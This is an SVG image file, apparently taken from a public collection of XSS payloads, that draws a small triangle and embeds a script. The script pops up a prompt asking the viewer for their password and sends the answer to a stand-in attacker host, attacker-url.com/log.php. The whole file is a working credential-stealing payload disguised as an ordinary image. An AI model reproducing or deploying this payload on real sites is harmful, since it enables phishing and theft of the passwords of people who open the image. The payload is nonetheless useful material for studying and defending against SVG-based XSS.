<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
    <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>

    <script>
        var passwd = prompt("Enter your password to continue");
        var xhr = new XMLHttpRequest();
        xhr.open("GET","https://attacker-url.com/log.php?password="+encodeURI(passwd));
        xhr.send();
    </script>
    <!-- from https://github.com/asmrprog/XSS-Payloads/blob/2e9a420cf3abe2c56eb9e80b581dcabbd96104a4/Password_steal.svg -->
</svg>